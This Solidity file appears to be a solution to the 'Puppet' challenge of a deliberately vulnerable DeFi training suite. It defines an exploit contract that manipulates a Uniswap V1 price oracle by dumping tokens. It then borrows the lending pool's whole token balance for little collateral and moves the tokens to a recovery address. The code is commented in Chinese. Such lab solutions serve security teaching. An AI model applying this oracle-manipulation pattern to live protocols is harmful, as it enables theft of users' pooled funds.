// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity =0.8.25;
import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract PuppetExploit {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;

    constructor(
        DamnValuableToken _token, 
        PuppetPool _pool, 
        IUniswapV1Exchange _exchange,
        address _recovery
    ) 
        payable
    {
        token = _token;
        lendingPool = _pool;
        uniswapV1Exchange = _exchange;
        recovery = _recovery;
    }

    function rescue() public {
        /*
            操纵预言机：使用尽可能多的 token 换取 ETH
        */
        // Swap: 使用 Token 换 ETH
        // 池子中总共有 10 ETH
        uint256 tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 10, block.timestamp, address(this));
        console.log("after tokenToEthTransferInput: ", address(uniswapV1Exchange).balance);
        /*
            借贷: 使用全部 ETH 换 Token
        */
        lendingPool.borrow{value: address(this).balance}( // 本合约所有ETH(剩余会返还)
            token.balanceOf(address(lendingPool)), // pool中所有Token
            address(this)
        );
        /*
            token 转入 recovery
        */
        token.transfer(recovery, token.balanceOf(address(this)));
    }

    receive() payable external {}
}